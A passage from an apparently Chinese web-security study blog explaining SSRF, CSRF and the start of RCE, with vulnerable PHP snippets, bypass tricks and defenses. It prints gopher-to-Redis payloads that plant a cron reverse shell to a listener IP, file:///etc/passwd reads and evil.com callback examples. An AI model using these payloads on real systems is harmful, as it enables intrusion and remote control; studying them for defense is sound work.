class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">function</span> GetFile(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span>) &#123; <br>    <span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, intval(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (error number <span class="hljs-variable">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-variable">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-variable">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= fgets(<span class="hljs-variable">$fp</span>, 1024); <br>        &#125; <br>        fclose(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>fsockopen</code>函数主要实现：初始化一个套接字连接到指定主机（host）实现对用户指定url数据的获取。该函数使用socket（端口）跟服务器建立tcp连接，传输数据。</p><p><code>fsockopen</code>函数将返回一个句柄，该句柄之后可以被其它文件类函数调用（例如，fgets()、fgetss()、fwrite()、fclose()、feof()，如果调用失败，则返回false）</p><p>变量host为指定主机名，port为端口（主要根据服务而定），errstr表示错误信息将以字符串的信息返回，30为时限。</p><p>同样也是添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>即可成功触发ssrf，并返回目标域名主页。用处不算大。</p></blockquote><ul><li><strong>curl_exec()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = curl_init();// 创建新的 cURL 资源<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, 0);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项<br>    <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$curlobj</span>);// 抓取 URL 并把它传递给浏览器<br>    curl_close(<span class="hljs-variable">$curlobj</span>);// 关闭 cURL 资源，并且释放系统资源<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.rand().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话。cURL通过PHP获取数据，并将获取到的文件数据保存至curled文件夹下的随机文件名文本文件中。</p><p>对于<code>curl_exec</code>的攻击方式：</p><ul><li>可以通过添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>触发其ssrf</li><li>通过<code>file、dict、gopher</code>这三个协议来进行渗透。（更常见的做法）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span> <br>curl -vvv <span class="hljs-string">&#x27;dict://127.0.0.1:6379/info&#x27;</span> <br><span class="hljs-comment"># 注意：链接使用单引号，避免$变量问题 </span><br>curl -vvv <span class="hljs-string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></code></pre></td></tr></table></figure><p>其中，<code>curl</code> 是一个命令行工具，用于发送和接收数据，通常用于与网页和服务器进行交互。</p><p><code>-vvv</code> 参数表示输出详细的调试信息，有助于查看命令的执行过程和返回结果</p><p><code>dict://127.0.0.1:6379/info</code>指定使用dict协议，来模拟一个访问Redis服务的请求，后面的IP和端口号指的是本地主机地址和Redis默认的监听端口号，<code>/info</code>用于获取Redis服务器的信息和统计数据（Redis常用命令）</p><p><code>gopher</code> 是一种互联网协议，它允许通过 URL 方式进行数据传输。这里的<code>gopher://127.0.0.1:6379/</code> 指定了一个 Redis 服务器的地址和端口号。</p><p>接下来是一系列以 <code>%0d%0a</code> 结尾的数据块，这些块构成了一个特定的Redis命令序列。</p><p>有关于上述对gopher协议的利用代码主要利用了Redis未授权访问漏洞，时期允许攻击者执行任意命令，包括执行恶意代码。</p></blockquote><ul><li><strong>SoapClient类</strong></li></ul><p><a href="https://blog.csdn.net/qq_37376469/article/details/130024611">PHP中原生类SoapClient反序列化的SSRF利用</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100569464">利用SoapClient类进行SSRF+CRLF攻击</a></p><blockquote><p>注意情况：</p><p>1.一般情况下PHP不会开启fopen的gopher wrapper </p><p>2.file_get_contents的gopher协议不能URL编码 </p><p>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 </p><p>4.curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 </p><p>5.curl_exec() &#x2F;&#x2F;默认不跟踪跳转</p><p>6.file_get_contents() &#x2F;&#x2F; file_get_contents支持php:&#x2F;&#x2F;input协议</p></blockquote><h5 id="可利用协议"><a href="#可利用协议" class="headerlink" title="可利用协议"></a>可利用协议</h5><ul><li><strong>file协议</strong></li></ul><p>结合<code>目录遍历</code>读取文件，从文件系统中获取文件内容。如<code>file:///etc/passwd</code>，其中<code>/etc/passwd</code>是用户账户文件。</p><ul><li><strong>gopher协议</strong></li></ul><p>分布式文档传递服务，可以<code>打开端口</code>，可以使用<code>gopherus</code>生成<code>payload</code></p><ul><li><strong>dict协议</strong></li></ul><p>· 字典服务器协议，可以访问字典资源，如<code>dict:///ip:6739/info</code>，其中<code>info</code>是Redis的常用命令。</p><p>· 可以探测指纹信息，使用格式如下：</p><blockquote><p><strong>dict:&#x2F;&#x2F;ip:port&#x2F;命令:命令2:命令3</strong></p><p>其中，命令是可选字段，每个命令使用冒号隔开。</p><p>例：dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;set:passwd:123456</p><p>dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;get:passwd 等</p><p>在实际地址栏中，这些指令的显示效果为：</p><p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;set:passwd:123456</p><p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:22</p></blockquote><p>· 可以写入反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png" alt="image-20240719145304230"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145316045.png" alt="image-20240719145316045"></p><p>· 可以用于<code>结合cURL攻击</code></p><p>· 最主要的还是进行<code>端口探测</code>！例如：dict:&#x2F;&#x2F;127.0.0.1:80</p><ul><li><strong>http&#x2F;https协议</strong></li></ul><p>进行<code>内网探测</code></p><ul><li><strong>ftp协议（sftp、tftp）</strong></li></ul><p>进行<code>端口扫描</code>。</p><p>· sftp，代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）。这是一种与SSH打包在一起的独立协议，它运行在安全连接上，并以如下类似的方式进行工作。</p><blockquote><p>在目标网站执行：</p><p><a href="http://example.com/ssrf.php?url=sftp://evil.com:9999/">http://example.com/ssrf.php?url=sftp://evil.com:9999/</a></p><p><code>evil.com</code>指代目标网站的域名或IP地址，其后冒号跟着的是自己设置的监听端口号。</p><p>在本地（如kali）终端开启监听，等待来自目标服务器的连接：</p><p>local:$ nc -lvvp 9999</p><p>Connection from [192.168.0.12] port 9999[tcp&#x2F;*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p><p>nc命令的输出表明（是别人的输出捏）攻击者已经成功接受了来自目标服务器的连接，即连接被建立了。</p></blockquote><p>· tftp，（Trivial File Transfer Protocol,简单文件传输协议），是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><blockquote><p>在目标网站执行：</p><p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a></p><p>其中，<code>TESTUDPPACKET</code>是一个UDP数据包</p><p>local:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p></blockquote><h4 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><h5 id="漏洞验证方式"><a href="#漏洞验证方式" class="headerlink" title="漏洞验证方式"></a>漏洞验证方式</h5><ul><li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li><li>使用dnslog等工具进行测试，看是否被访问(可以再盲打后台，比如将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</li><li>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址：</li></ul><blockquote><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>通过二级域名暴力猜解工具模糊猜测内网地址</p><p>通过file协议读取内网信息获取相关地址</p></blockquote><ul><li>留意bool型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法</li><li>直接返回Banner、title、content等信息</li></ul><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等;</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等;</p><blockquote><p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p></blockquote><p>7、本地利用和远程利用</p><p><a href="https://www.freebuf.com/articles/web/258449.html">ssrf知识点总结</a></p><h4 id="4、绕过方式"><a href="#4、绕过方式" class="headerlink" title="4、绕过方式"></a>4、绕过方式</h4><h5 id="绕过（http基本身份认证绕过）"><a href="#绕过（http基本身份认证绕过）" class="headerlink" title="@绕过（http基本身份认证绕过）"></a>@绕过（http基本身份认证绕过）</h5><p>使用前提：目标网站对访问的域名进行限制，且其本身存在ssrf漏洞时。</p><blockquote><p>url的完整格式为：</p><p>协议类型:&#x2F;&#x2F;访问资源需要的凭证信息@服务器地址:端口号&#x2F;资源层级UNIX文件路径（精确到文件名）?查询#片段ID</p></blockquote><p>因此！</p><blockquote><p>访问<code>&lt;a href=&quot;http://baidu.com@1.1.1.1&quot;&gt;</code>、<code>http://baidu.com@1.1.1.1</code></p><p>与</p><p>访问<code>http://1.1.1.1</code></p><p>其得到的效果是一样的。因为解析的本就是@后的服务器地址。</p><p>意思就是！比如，ssrf只允许访问百度：</p><p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com</code></p><p>我们的目标是绕过百度访问搜狗，可以使用@绕过：</p><p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com@www.sogou.com</code></p><p>注意：在对@解析域名中，不同的处理函数存在处理差异，比如在PHP的parse_url()中会识别<code>www.sogou.com</code>，而libcurl()则识别为<code>www.baidu.com</code>。</p></blockquote><h5 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h5><blockquote><p>顾名思义，就是使用<code>进制转换</code>来进行绕过嘛！将一些关键数字参数使用<code>二进制</code>、<code>八进制</code>、<code>十六进制</code>、<code>十进制整数格式</code>进行转换。</p><p>比如，IP地址 192.168.0.1 可以被改写为：</p><p>八进制格式：0300.0250.0.1</p><p>十六进制格式：0xC0.0xA8.0.1</p><p>十进制整数格式：3232235521（第一次听说这个哈哈哈）</p></blockquote><ul><li>————————————————————————</li></ul><p>IP地址的十进制整数格式计算方法：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721391030526.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721390879675.png" alt="img"></p><ul><li>————————————————————————</li></ul><h5 id="用句号”。”替换-“-”"><a href="#用句号”。”替换-“-”" class="headerlink" title="用句号”。”替换 “.”"></a>用句号”。”替换 “.”</h5><blockquote><p>将IP地址中各个分隔部分的“.”号均分别使用“。”替代：</p><p>例：192.168.204.128 —-&gt; 192。168。204.128</p><p>但是执行过程中，右边的表达也会被解析为左边的表达。</p></blockquote><h5 id="xip-io-和-xip-name-绕过"><a href="#xip-io-和-xip-name-绕过" class="headerlink" title="xip.io 和 xip.name 绕过"></a>xip.io 和 xip.name 绕过</h5><p>使用前提：服务端没有先解析IP再过滤内网地址，就可以使用localhost等解析到内网的域名。（ xip.name在使用上与xip.io一致）</p><p>此外，如果php后端只使用parse_url函数中的host参数判断是否等于127.0.0.1，那么就可以使用<code>xip.io</code>、<code>nip.io</code>、<code>sslip.io</code>这些特殊网址进行绕过。</p><blockquote><p><code>xip.io</code>可以指向任意域名。所以可以将其与内网IP&#x2F;域名进行绑定，使其解析到内网。</p><p>例；<code>http://127.0.0.1.xip.io/1.php</code>实际上会解析到<code>http://127.0.0.1/1.php</code></p></blockquote><h5 id="添加端口号"><a href="#添加端口号" class="headerlink" title="添加端口号"></a>添加端口号</h5><p>有些网站可能会限制子网段。因此可以在URL中目标IP地址后面使用冒号“:”添加服务端口号，常用的是，添加<code>：80</code>端口绕过。</p><h5 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用[::]绕过"></a>利用[::]绕过</h5><p>利用<code>[::]</code>来实现绕过。<code>http://[::]:80/</code>会解析为<code>http://127.0.0.1</code></p><h5 id="DNS-重绑（Rebinding）"><a href="#DNS-重绑（Rebinding）" class="headerlink" title="DNS 重绑（Rebinding）"></a>DNS 重绑（Rebinding）</h5><p>工具网站：<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p><a href="https://blog.csdn.net/qq_36348899/article/details/119297854">[DNS安全] 详解DNS重绑定攻击</a></p><blockquote><p>重绑逻辑：</p><p>1、判定你给的 IP 或者域名解析后的 IP 是否在黑名单中</p><p>2、若在，退出报错</p><p>3、若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块</p><p>实现效果：</p><p>拥有一个域名，其映射到两个IP。同时设置 TTL 为 0，方便两个 IP 切换。</p><p>效果类比：你访问wwfcww.xyz这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的IP是 127.0.0.1，如此一来即可进行 SSRF 攻击。</p></blockquote><h5 id="非HTTP协议绕过"><a href="#非HTTP协议绕过" class="headerlink" title="非HTTP协议绕过"></a>非HTTP协议绕过</h5><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过<code>gopher</code>，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</p><p> 例，使用gopher协议对与内网的Redis服务进行攻击，可使用如下url：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1%0d%0a<span class="hljs-variable">$8</span>%0d%0aflushall%0d%0a*3%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$1</span>%0d%0a1%0d%0a<span class="hljs-variable">$64</span>%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$3</span>%0d%0adir%0d%0a<span class="hljs-variable">$16</span>%0d%0a/var/spool/cron/%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$10</span>%0d%0adbfilename%0d%0a<span class="hljs-variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="hljs-variable">$4</span>%0d%0asave%0d%0aquit%0d%0a<br></code></pre></td></tr></table></figure><p>前面讲漏洞利用的时候提到过协议渗透。请回去复习。</p><h4 id="5、漏洞防御"><a href="#5、漏洞防御" class="headerlink" title="5、漏洞防御"></a>5、漏洞防御</h4><blockquote><p>1、在内网设备上建立黑名单内网IP，禁止公开服务器的访问。</p><p>2、过滤返回信息，对响应用户请求的返回信息进行验证。</p><p>3、禁用端口banner信息。</p><p>4、禁用不必要的协议，防止file协议等。</p><p>5、根据业务需求设定URL格式。防止攻击者构建攻击语句6、统一错误信息，避免攻击者根据错误信息判断端口状态7、限制请求端口。</p></blockquote><h3 id="④CSRF跨站请求伪造"><a href="#④CSRF跨站请求伪造" class="headerlink" title="④CSRF跨站请求伪造"></a>④CSRF跨站请求伪造</h3><h4 id="1、漏洞简介-2"><a href="#1、漏洞简介-2" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>· csrf（xsrf），跨站请求伪造，也被称为one-click attack 或 session riding。是一种<code>挟持用户在当前已登录的web应用程序上执行非本意操作</code>的攻击方法。</p><p>· <strong>原理</strong>：黑客利用已登陆的用户，<code>诱使其访问或登陆某个早已构造好的恶意链接或页面</code>，然后在<code>用户毫不知情</code>的情况下，<code>以用户的名义完成了非用户本意的非法操作</code>。</p><p>· <strong>实现的效果</strong>：csrf跨站请求伪造的实现效果，可以理解为攻击者盗用了合法用户的身份，以其名义在恶意网站发送恶意请求，合法用户发起的恶意请求对服务器来说是合法的。</p><p>· <strong>与XSS跨站脚本攻击相比</strong>：</p><blockquote><p>XSS利用的是用户对指定网站的信任（攻击者预先将恶意代码插入网站网页中）</p><p>CSRF利用的是网站对用户网页浏览器的信任。（攻击者诱使用户点击恶意链接或页面进而向服务器发送恶意请求）</p><p>注意！</p><p>CSRF攻击中，攻击者并没有拿到用户的权限。是借用户的权限完成了攻击（“借刀杀人”）</p><p>而XSS攻击中，攻击者可以通过盗取cookie来获取用户权限进而完成破坏。（“侵占”）</p></blockquote><p>· <strong>攻击细节</strong>：</p><p>csrf（跨站请求攻击）简单来说，就是攻击者通过一些技术手段<code>欺骗</code>用户的浏览器去访问一个用户<code>曾经认证过的网站</code>并运行一些操作（如发邮件、发信息、财产操作如转账或购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p><p>攻击过程中利用了web中用户身份验证的漏洞：<code>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</code>。</p><p>典型示例：tom登陆了银行网站且没有退出，此时浏览器中包含着tom在银行的身份验证信息 —-  攻击者将伪造的转账请求包含在帖子中，并发送给tom —-  tom在银行网站保持登陆的情况下浏览帖子 —-  即会将伪造的转账请求连同身份的认证信息发送到银行网站 —-  银行网站看到身份认证信息，认为请求是tom的合法操作。</p><p>· <strong>原理总结</strong>：</p><blockquote><p>一个CSRF漏洞攻击的实现，其需要由‘几个部分’来构成：</p><p>1、首先，需要有一个漏洞存在（无需验证、任意修改后台数据、新增请求）</p><p>2、伪装数据操作请求的恶意链接或页面</p><p>3、诱使用户主动访问或登陆恶意链接，触发非法操作</p></blockquote><h4 id="2、漏洞检测"><a href="#2、漏洞检测" class="headerlink" title="2、漏洞检测"></a>2、漏洞检测</h4><ul><li><p>方法一：抓取一个正常请求的数据包，去掉referer字段后再重新提交，如果该提交还是有效的，那么基本上可以确认目标网站存在csrf漏洞。</p></li><li><p>方法二：使用专门针对csrf漏洞检测的工具进行检测，如CSRFTester，CSRF Request Builder 等。</p></li></ul><blockquote><p>CSRFTester漏洞检测工具的测试原理：首先需要抓取我们在浏览器中访问过的所有链接以及所有表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这部操作相当于伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞。</p><p>（所以这些检测工具也可以被用来执行CSRF攻击！）</p></blockquote><h4 id="3、漏洞利用-1"><a href="#3、漏洞利用-1" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><p><a href="https://blog.csdn.net/wudideaqing/article/details/139678044">CSRF(跨站请求伪造)漏洞 (带靶场演示+漏洞挖掘）</a></p><h5 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h5><p>有以下五种：</p><blockquote><ul><li>链接点击：</li></ul><p>攻击者通过邮件、社交媒体或其它方式发送包含恶意请求的链接，并诱导用户点击。</p><ul><li>隐藏表单</li></ul><p>在恶意网站上嵌入隐藏的表单，诱导用户在不知情的情况下触发表单提交。</p><ul><li>自动提交表单</li></ul><p>在恶意网站上使用javascript自动提交包含恶意请求的表单。如，编写响应功能的POC。</p><ul><li>图像加载</li></ul><p>在恶意网站嵌入图像标签，图像URL指向目标网站的恶意请求。</p><ul><li>跨域请求</li></ul><p>利用XMLHttpRequest或Fetch API发送跨域请求。（但是这通常会被浏览器中的同源策略和CORS限制）</p><p>CORS：跨源资源共享机制。用于定义在一个域中加载的客户端web应用程序与另一个域中的资源交互方式。</p></blockquote><h4 id="4、漏洞防御"><a href="#4、漏洞防御" class="headerlink" title="4、漏洞防御"></a>4、漏洞防御</h4><ul><li><strong>检查Referer字段</strong></li></ul><p>在HTTP协议头中有一个字段叫做Referer，它记录了该HTTP请求的来源地址。在处理敏感数据请求时，Referer字段（<code>不会骗人的真实请求地址</code>）应该要和请求的地址（<code>对方声称的请求地址</code>）处于同一个域名下。</p><p>但是该由于Referer的值是由浏览器提供的，每个浏览器对于Referer字段的具体实现存在差别，因此，并不能保证浏览器自身并没有安全漏洞。</p><p><a href="https://blog.csdn.net/SongSir001/article/details/98182051">CSRF（跨站请求伪造） 漏洞与预防-有预防代码实现</a></p><ul><li><strong>在请求地址中添加token并验证</strong></li></ul><p>CSRF攻击成功的原因是：因为攻击者能够<code>伪造用户的请求</code>，且该请求中所有的用户验证信息<code>都存在于cookie</code>中，因此攻击者可以在无需知道用户验证信息的情况下直接利用用户自己的cookie来通过安全验证。</p><p>所以！抵御CSRF攻击的关键在于：<code>在请求中放入一些攻击者不能伪造的信息，并且该信息不存在于cookie当中</code>。</p><p>所以，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在该服务器上建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。（这个防御手法一般是开发人员做）</p><ul><li><strong>当前用户密码验证</strong></li></ul><p>在修改关键信息时，要求当前用户输入其自身的密码，以验证当前用户身份的真伪，进而防止未授权的恶意操作。</p><ul><li><strong>SameSite Cookie 属性</strong></li></ul><p>设置 Cookie 的 SameSite 属性为 Strict 或 Lax，防止跨站请求携带 Cookie。</p><ul><li><strong>定期重置 Session ID</strong></li></ul><p>降低会话被劫持的风险，确保会话令牌的安全性。</p><h3 id="⑤RCE远程代码执行漏洞"><a href="#⑤RCE远程代码执行漏洞" class="headerlink" title="⑤RCE远程代码执行漏洞"></a>⑤RCE远程代码执行漏洞</h3><h4 id="1、漏洞简介-3"><a href="#1、漏洞简介-3" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>RCE，远程命令执行&#x2F;远程代码执行。指用户通过<code>浏览器</code>提交执行操作命令，由于服务器端没有针对执行函数做过滤，就执行了恶意命令&#x2F;代码。</p><ul><li><strong>出现：</strong>应用程序<code>直接/间接</code>使用了动态执行命令&#x2F;代码的危险函数，并且函数的运行参数是<code>用户可控</code>的。</li></ul><p><strong>·</strong> 远程命令执行，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如常见的<code>路由器</code>、<code>防火墙</code>、<code>入侵检测等设备</code>的web管理页面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者对该功能没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令。</p><p><strong>·</strong> 远程代码执行，亦是同样的道理，后台有时候会把用户的输入 作为代码的一部分进行执行。</p><ul><li><strong>原理：</strong>当用户控制命令&#x2F;代码执行函数中的参数时，注入恶意系统命令到正常命令中，造成命令&#x2F;代码执行攻击。</li></ul><p><strong>·</strong> RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p><ul><li><p><strong>本质：</strong>程序设计违背了<code>数据与代码分离</code>的原则。</p></li><li><p><strong>远程命令执行和远程代码执行的区别：</strong></p></li></ul><blockquote><p>远程命令执行：一般指操作系统命令</p><p>远程代码执行：一般指的是脚本代码</p></blockquote><h4 id="2、命令拼接符"><a href="#2、命令拼接符" class="headerlink" title="2、命令拼接符"></a>2、命令拼接符</h4><h5 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h5><blockquote><p><code>|</code>：管道符，前面命令的输出作为后面命令的输入。如 help | more，前面help命令会输出help的所有用法选项，这些选项输入给more，进行分页展示。</p><p><code>&amp;</code>：commandA &amp; commandB，运行命令A，然后再运行命令B。</p><p><code>||</code>：commandA || commandB，运行命令A，如果失败则运行命令B，如果成功也不再需要运行命令B了。</p><p><code>&amp;&amp;</code>：commandA &amp;&amp; commandB，运行命令A，如果成功则运行命令B，言外之意就是运行A失败后不再运行后面的命令。</p></blockquote><h5 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h5><p>windows系统下的命令拼接符均使用于Linux下，此外，Linux还有：</p><blockquote><p><code>;</code>前后命令都执行，执行A后又执行B，或更多条命令。</p></blockquote><h4 id="3、执行函数"><a href="#3、执行函数" class="headerlink" title="3、执行函数"></a>3、执行函数</h4><h5 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h5><blockquote><ul><li><p><code>system()</code>: 执行一个外部的应用程序，并显示输出的结果</p></li><li><p><code>passthru()</code>: 执行一个UNIX系统命令并显示原始的输出</p></li><li><p><code>exec()</code>: 执行一个外部的应用程序，只返回最后一行的结果</p></li><li><p><code>shell_exec()</code>: 执行<code>shell</code>命令并返回 输出的结果的字符串</p></li></ul><p>popen()：用于创建一个管道，通过该管道可以执行一个shell命令并获取其输出。执行示例<code>fp = popen(&quot;ls -l&quot;, &quot;r&quot;);</code></p><p>proc_open(): 用于创建一个新进程，并提供更灵活的控制和通信方式，比如可以指定输入输出流。</p><p>pcntl_exec(): 用于在当前进程中执行一个新的程序，替换当前进程的内容。</p></blockquote><p>常使用的是前面四个！</p><h5 id="代码执行函数"><a href="#代码执行函数" 